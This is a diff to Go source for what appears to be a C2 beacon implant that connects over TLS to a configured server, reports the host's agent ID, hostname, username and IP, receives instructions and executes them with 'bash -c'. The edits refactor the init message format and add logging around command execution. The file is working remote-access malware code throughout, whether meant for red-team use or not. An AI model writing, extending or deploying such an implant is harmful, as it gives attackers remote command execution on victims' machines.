@@ -44,7 +44,7 @@ func main() {
 		}
 
 		ip := getLocalIP(beacon)
-		initMessage := formatInitMessage(agentID, hostname, username, ip)
+		initMessage := formatInitMessage(agentID, hostname, username, ip, "NoKeysBeacon")
 		sendMessage(beacon, initMessage)
 
 		instruct := receiveInstructions(beacon)
@@ -104,7 +104,7 @@ func generateAgentMetadata() (string, string, string) {
 func establishConnection(config *tls.Config) (*tls.Conn, error) {
 	beacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
 	if err != nil {
-		logger.Logf(logger.Error, "Error occurred while connecting: %v\n", err)
+		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
 	}
 	return beacon, err
 }
@@ -114,13 +114,13 @@ func getLocalIP(beacon *tls.Conn) string {
 	return fmt.Sprintf("%v", ipAddress)
 }
 
-func formatInitMessage(agentID, hostname, username, ip string) string {
-	return fmt.Sprintf("%s:%s:%s:%s:NoKeysBeacon:%s:%s:%s:%s:MASTERKEY", 
-		agentID, username, hostname, ip, ServerIP, ServerPort, CallbackFrequency, CallbackJitter)
+func formatInitMessage(agentID, hostname, username, ip string, beaconType string) string {
+	return fmt.Sprintf("%s:%s:%s:%s:%s:%s:%s:%s:%s:MASTERKEY", 
+		agentID, username, hostname, ip, beaconType, ServerIP, ServerPort, CallbackFrequency, CallbackJitter)
 }
 
 func sendMessage(beacon *tls.Conn, message string) {
-	logger.Logf(logger.Debug, "Sending: %s\n", message)
+	logger.Logf(logger.Debug, "Sending: %s", message)
 	_, _ = beacon.Write([]byte(message + "\n"))
 }
 
@@ -194,8 +194,10 @@ func runShellCommand(command string) string {
 	cmd := exec.Command("bash", "-c", command)
 	output, err := cmd.CombinedOutput()
 	if err != nil {
+		logger.Logf(logger.Error, "Error running command: %v", command)
 		return err.Error()
 	}
+	logger.Logf(logger.Done, "Ran command: %v", command)
 	return string(output)
 }
 
